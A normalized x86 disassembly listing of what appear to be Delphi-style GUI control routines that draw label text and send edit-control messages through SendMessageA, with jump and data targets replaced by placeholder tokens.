mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41d450
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41d3ac
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_430ee4
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_431286
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41d450
call sub_42bf68
call sub_42c048
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41d3ac
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43bbcc
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_4124e4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4124e4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x54 ]
call sub_40421c
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x58 ]
call sub_40441c
push eax
mov eax edi
call sub_41d530
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_4124e4
mov eax ebx
mov si 0xffc8
call sub_403420
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41cc90
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41cc90
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d070
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41cc90
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41d530
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43128d
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403f80
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x60 ]
call sub_40463c
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403f80
retn
mov eax ebx
mov si 0xffc8
call sub_403420
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d070
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43bbcc
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43bbcc
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41d390
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_4124e4
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_4124e4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43bbcc
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404788
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41d530
push eax
call sub_42bf68
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42c1b0
jmp r-xdata
call sub_42bf68
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_42c214
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41d530
push eax
call sub_42bf68
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42c104
push 0x0
mov eax edi
call sub_41d530
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43bbcc
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_43dec4
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x80 ]
call sub_40421c
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x84 ]
call sub_40441c
push eax
mov eax edi
call sub_41d530
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41cc90
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x88 ]
call sub_40421c
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x8c ]
call sub_40441c
push eax
mov eax edi
call sub_41d530
push eax
call DrawTextA
sub_431297
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_431312
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bbcc
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_452910
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_441850
mov eax ebx
mov si 0xffb8
call sub_403420
test al al
je r-xdata
mov eax ebx
call sub_44292c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431319
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_431364
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4435f4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43b388
mov edx 0x11
mov eax esi
call sub_43b3ac
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_42bf68
call sub_42c048
test al al
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_431410
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_431566
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43dec4
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41d450
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404224
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40421c
push eax
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d530
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41c4c4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40421c
push eax
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d530
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41c4c4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_40421c
push eax
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ ebx + 0x160 ]
call sub_41d530
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43156d
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_431577
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_4317a0
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41cdac
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41cc90
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41cdac
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41d034
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403420
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403420
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_431698
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41d5b0
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403420
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41d5b0
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403420
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_4389ac
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_4317dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4317a0
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43183c
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403420
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431864
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43b09c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_4318c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_431955
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43195c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bbcc
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_452910
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403420
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_4319ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43e0f8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_43b388
mov edx 0x19
mov eax esi
call sub_43b3ac
mov dl 0x1
mov eax esi
call sub_442600
xor edx edx
mov eax esi
call sub_43bd90
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_4320bc
mov eax esi
test bl bl
je r-xdata
sub_431a54
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431ad4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_4426d0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_431b18
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_4426d0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_4423cc
push eax
call SendMessageA
test eax eax
setne bl
sub_431b50
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4426d0
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_4423cc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431b88
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_431c05
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431c0c
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_4426d0
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bbcc
mov eax [ ebp - 0x4 ]
call sub_40441c
mov edx eax
mov eax ebx
call sub_43bba8
sub_431c10
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_4426d0
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_4423cc
push eax
call SendMessageA
sub_431c4c
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_431c70
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_431c90
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_431cc0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_431d5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_43bb40
inc eax
call sub_408694
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_431de6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4086a8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43bb50
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40850c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431ded
mov eax [ ebp - 0xc ]
call sub_4086e0
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_431df8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_40404c
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_43bb40
inc eax
call sub_408694
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_431e86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4086a8
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43bb50
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4086e0
retn
sub_431e94
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f258
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43f184
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_431f4d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_43f554
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_43f554
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_431fc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_431fff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432006
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_432006
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_431b50
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_432080
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_4423cc
push eax
call SendMessageA
sub_432080
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_4320bc
pop ebx
retn
sub_4320bc
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41c4d8
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_43b3ac
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_432188
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_43ff44
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_4321c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_4423cc
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_4423cc
push eax
call SendMessageA
sub_432200
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4419e4
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_432080
mov eax ebx
call sub_43f96c
sub_432234
push ebx
mov ebx eax
mov eax ebx
call sub_441928
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4320bc
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_43227c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_441780
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_4423cc
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_431d40
sub_4322b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4426d0
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403420
push 0xfffffff0
mov eax esi
call sub_4423cc
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_4322f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4434ac
pop esi
pop ebx
retn
sub_43230c
push ebx
push esi
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
call sub_4426d0
test al al
jne r-xdata
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_43237c
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
